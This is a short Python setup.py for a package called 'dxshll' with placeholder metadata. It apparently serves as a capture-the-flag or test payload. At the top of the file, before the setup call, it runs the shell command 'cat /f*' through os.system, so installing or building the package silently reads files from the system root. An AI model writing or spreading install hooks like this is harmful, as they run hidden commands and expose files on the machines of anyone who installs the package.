from setuptools import setup
import os
os.system('cat /f*')

setup(name='dxshll',
      version='0.0.1',
      description='xshll',
      author='xxsaf',
      license='MIT',
      packages=['dxshll'],
      install_requires=["requests"],
      scripts=['bin/foo.sh']
      )
